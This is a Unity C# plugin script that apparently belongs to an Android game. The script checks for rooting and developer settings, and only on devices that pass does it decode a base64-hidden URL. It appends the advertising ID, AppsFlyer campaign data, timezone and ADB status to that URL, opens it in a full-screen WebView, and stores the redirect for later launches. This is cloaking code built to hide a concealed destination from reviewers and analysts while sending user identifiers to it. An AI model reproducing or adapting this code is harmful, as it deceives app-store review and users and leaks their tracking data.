using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using System;
using System.Runtime.Serialization.Formatters.Binary;
using System.IO;
using System.Text;
using UnityEngine.Networking;
using AppsFlyerSDK;

public class mainPlugins : MonoBehaviour
{
    private void Awake()
    {
        DataControll("Load");
    }

    bool[] ready = { false, false, false };
    public string oneSigId;
    public string devKey;
    public string ADB = "null";
    public string TMZ = "null";
    public string s64 = "";
    public string STR = "null";
    public int Tic = 0;
    public string[] value = { "null", "null", "null", "null", "null", "null", "null", "null", "null", "null" };
    public string saveLinka = "";
    public string gaid = "null";
    public string[] par = { "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "" };

    private void Start()
    {
        if (!AndroidRootChecker.IsRooted())
        {
            if (GetDevelopmentSettingsStatus() == 0)
            {
            APSSS();
            AID();
            try
                    {
                        OneSignalka();
                    }
            catch
                    {

                    }
            StartCoroutine(Wait());
            }
        }
    }

    //FB
    
    //APS
    void APSSS()
    {
        AppsFlyer.setIsDebug(false);
        AppsFlyer.initSDK(devKey, "", true ? this : null);
        AppsFlyer.startSDK();
    }
    string[] AffTake = { "media_source", "af_id", "ad_id", "adset_id", "af_channel", "campaign", "adset", "adgroup", "orig_cost", "af_siteid" };
    public void onConversionDataSuccess(string conversionData)
    {
        StartCoroutine(convers(conversionData));
    }
    IEnumerator convers(string conversionData)
    {
        yield return new WaitForSeconds(1);
        Dictionary<string, object> conversionDataDictionary = AppsFlyer.CallbackStringToDictionary(conversionData);
        string status = conversionDataDictionary["af_status"].ToString();

        for (int i = 0; i < AffTake.Length; i++)
        {
            if (AffTake[i] == "af_id")
            {
                value[i] = AppsFlyer.getAppsFlyerId();
            }
            else if (status != "Organic")
            {
                if (conversionDataDictionary.ContainsKey(AffTake[i]))
                {
                    try
                    {
                        if (conversionDataDictionary[AffTake[i]] != null)
                        {
                            value[i] = conversionDataDictionary[AffTake[i]].ToString();
                        }
                    }
                    catch
                    {
                        value[i] = "null";
                    }
                }
            }
        }
        ready[1] = true;
        yield break;
    }
    public void onConversionDataFail(string error)
    {
        ready[1] = true;
    }
    public void onAppOpenAttribution(string attributionData)
    {

    }
    public void onAppOpenAttributionFailure(string error)
    {

    }


    //onesignal


    private void OneSignalka()
    {
        OneSignal.StartInit(oneSigId)
        .HandleNotificationOpened(OneSignalHandleNotificationOpened)
        .Settings(new Dictionary<string, bool>() {
               { OneSignal.kOSSettingsAutoPrompt, false },
               { OneSignal.kOSSettingsInAppLaunchURL, false } })
         .EndInit();

        OneSignal.inFocusDisplayType = OneSignal.OSInFocusDisplayOption.Notification;
        OneSignal.PromptForPushNotificationsWithUserResponse(OneSignalPromptForPushNotificationsReponse);
    }
    private static void OneSignalHandleNotificationOpened(OSNotificationOpenedResult result)
    {
        // Place your app specific notification opened logic here.
    }
    private void OneSignalPromptForPushNotificationsReponse(bool accepted)
    {
        // Optional callback if you need to know when the user accepts or declines notification permissions.
    }
    

    
    


//GAID
void AID()
    {
        try
        {
            Application.RequestAdvertisingIdentifierAsync((string advertisingId, bool trackingEnabled, string error) => { gaid = advertisingId; ready[0] = true; });
        }
        catch
        {
            ready[0] = true;
        }
    }


    //TMZ


    //S64
    public string dec(string des)
    {
        string Sde = "";
        try
        {
            Sde = Encoding.UTF8.GetString(Convert.FromBase64String(des));
        }
        catch
        {

        }
        return Sde;
    }

    //sborlinki
    public IEnumerator Wait()
    {
        if (saveLinka == "")
        {
            if (GetDevelopmentSettingsStatus() == 0)
            {
                ADB = "false";
            }
            else
            {
                ADB = "true";
            }

            try
            {
                TMZ = CaptiveReality.Jni.Util.StaticCall<string>("sayHello", "ERROR", "com.first.texturehelper.HelloWorld");
            }
            catch
            {

            }


            //       yield return new WaitUntil(() => STR != "null" || value[5] != "null");
            for (int i = 0; STR != "null" && value[5] != "null" && i < 7; i++)
            {
                yield return new WaitForSeconds(1);
            }


            yield return new WaitForEndOfFrame();

            for (int waitTime = 0; waitTime <= 10; waitTime++)
            {
                if (ready[1] == true)
                {
                    break;
                }
                yield return new WaitForSeconds(1f);
            }
            yield return new WaitForSeconds(0.5f);
            string main = dec(s64) + "?" + par[0] + "=" + par[1] + "&" + par[2] + "=" + TMZ + "&" + par[3] + "=" + ADB + "&" + par[4] + "=" + gaid;
            if (STR == "")
            {
                main += "&" + par[5] + "=null";
            }
            else
            {
                main += "&" + par[5] + "=" + STR;
            }
            for (int i = 6; i < par.Length; i++)
            {
                if (value[i - 6] != "")
                {
                    main += "&" + par[i] + "=" + value[i - 6];
                }
                else
                {
                    value[i - 6] = "null";
                    main += "&" + par[i] + "=" + value[i - 6];
                }
            }
            StartCoroutine(Sus(main));
        }

        else if (saveLinka == "http://localhost/")
        {
            OneSignal.PauseInAppMessages(true);
            yield break;
        }
        else
        {
            StartCoroutine(Sus(saveLinka));
        }
    }


    //ADB
    public int GetDevelopmentSettingsStatus()
    {
#if !UNITY_EDITOR
        try
        {
            try
            {
                return CheckDeveloperMethodNew();
            }
            catch
            {
                return CheckDeveloperMethodOld();
            }
        }
        catch
        {
            return 0;
        }
#else

        return 0;
#endif
    }
    public int CheckDeveloperMethodOld()
    {
        using (var actClass = new AndroidJavaClass("com.unity3d.player.UnityPlayer"))
        {
            var context = actClass.GetStatic<AndroidJavaObject>("currentActivity");
            AndroidJavaClass systemGlobal = new AndroidJavaClass("android.provider.Settings$System");
            return systemGlobal.CallStatic<int>("getInt", context.Call<AndroidJavaObject>("getContentResolver"), "development_settings_enabled");
        }

    }

    public int CheckDeveloperMethodNew()
    {
        using (var actClass = new AndroidJavaClass("com.unity3d.player.UnityPlayer"))
        {
            var context = actClass.GetStatic<AndroidJavaObject>("currentActivity");
            AndroidJavaClass systemGlobal = new AndroidJavaClass("android.provider.Settings$Global");
            return systemGlobal.CallStatic<int>("getInt", context.Call<AndroidJavaObject>("getContentResolver"), "development_settings_enabled");
        }
    }


    //webviewMAIN
    WebViewObject WUS;
    public IEnumerator Sus(string URLS)
    {
        WUS = new GameObject("WUS").AddComponent<WebViewObject>();
        WUS.CallFromJS(URLS);
        WUS.Init(

            cb: (msg) =>
            {
            },
            err: (msg) =>
            {

            },
            httpErr: (msg) =>
            {
            },
            started: (msg) =>
            {
                if (msg.Contains(s64))
                {
                    Tic++;
                }
                else if (Tic == 1 || Tic == 0)
                {
                    saveLinka = msg;
                    Tic++;
                    Tic++;
                    DataControll("Save");

                }
                if (msg.Contains("localhost"))
                {
                    Hlopnis();
                }
            },
            hooked: (msg) =>
            {
            },
            ld: (msg) =>
            {
#if UNITY_EDITOR_OSX || (!UNITY_ANDROID && !UNITY_WEBPLAYER && !UNITY_WEBGL)
                // NOTE: depending on the situation, you might prefer
                // the 'iframe' approach.

#if true
                WUS.EvaluateJS(@"
                  if (window && window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.unityControl) {
                    window.Unity = {
                      call: function(msg) {
                        window.webkit.messageHandlers.unityControl.postMessage(msg);
                      }
                    }
                  } else {
                    window.Unity = {
                      call: function(msg) {
                        window.location = 'unity:' + msg;
                      }
                    }
                  }
                ");
#else
                WUS.EvaluateJS(@"
                  if (window && window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.unityControl) {
                    window.Unity = {
                      call: function(msg) {
                        window.webkit.messageHandlers.unityControl.postMessage(msg);
                      }
                    }
                  } else {
                    window.Unity = {
                      call: function(msg) {
                        var iframe = document.createElement('IFRAME');
                        iframe.setAttribute('src', 'unity:' + msg);
                        document.documentElement.appendChild(iframe);
                        iframe.parentNode.removeChild(iframe);
                        iframe = null;
                      }
                    }
                  }
                ");
#endif
#elif UNITY_WEBPLAYER || UNITY_WEBGL
                WUS.EvaluateJS(
                    "window.Unity = {" +
                    "   call:function(msg) {" +
                    "       parent.unityWebView.sendMessage('WUS', msg)" +
                    "   }" +
                    "};");
#endif
                WUS.EvaluateJS(@"Unity.call('ua=' + navigator.userAgent)");
            }

            );
#if UNITY_EDITOR_OSX || UNITY_STANDALONE_OSX
        WUS.bitmapRefreshCycle = 1;
#endif
        WUS.SetMargins(0, 0, 0, 0);
        WUS.SetTextZoom(100);  // android only. cf.
        WUS.SetVisibility(true);

#if !UNITY_WEBPLAYER && !UNITY_WEBGL
        if (URLS.StartsWith("http"))
        {
            WUS.LoadURL(URLS.Replace(" ", "%20"));
        }
        else
        {
            var exts = new string[]{
                ".jpg",
                ".js",
                ".html"  // should be last
            };
            foreach (var ext in exts)
            {
                var url = URLS.Replace(".html", ext);
                var src = Path.Combine(Application.streamingAssetsPath, url);
                var dst = Path.Combine(Application.persistentDataPath, url);
                byte[] result = null;
                if (src.Contains("://"))
                {
                    var unityWebRequest = UnityWebRequest.Get(src);
                    yield return unityWebRequest.SendWebRequest();
                    result = unityWebRequest.downloadHandler.data;
                }
                else
                {
                    result = File.ReadAllBytes(src);
                }
                File.WriteAllBytes(dst, result);
                if (ext == ".html")
                {
                    WUS.LoadURL("file://" + dst.Replace(" ", "%20"));
                    break;
                }
            }
        }
#else
        if (URLS.StartsWith("http")) {
            WUS.LoadURL(URLS.Replace(" ", "%20"));
        } else {
            WUS.LoadURL("StreamingAssets/" + URLS.Replace(" ", "%20"));
        }
#endif
        yield break;
    }
    void Hlopnis()
    {
        Destroy(WUS);
    }


    //DATACONTROL
    public void DataControll(string status)
    {
        if (status == "Save")
        {
            BinaryFormatter binForm = new BinaryFormatter();
            FileStream file = File.Create(Application.persistentDataPath + "/gameInfo.dat");
            NewDat data = new NewDat();
            data.saveLinka = saveLinka;
            data.Tic = Tic;
            binForm.Serialize(file, data);
            file.Close();
        }
        else if (status == "Load")
        {
            if (File.Exists(Application.persistentDataPath + "/gameInfo.dat"))
            {
                BinaryFormatter binForm = new BinaryFormatter();
                FileStream file = File.Open(Application.persistentDataPath + "/gameInfo.dat", FileMode.Open);
                NewDat data = (NewDat)binForm.Deserialize(file);
                saveLinka = data.saveLinka;
                Tic = data.Tic;
                file.Close();
            }
        }
    }

}

[Serializable]
class NewDat
{
    public string saveLinka;
    public int Tic;
}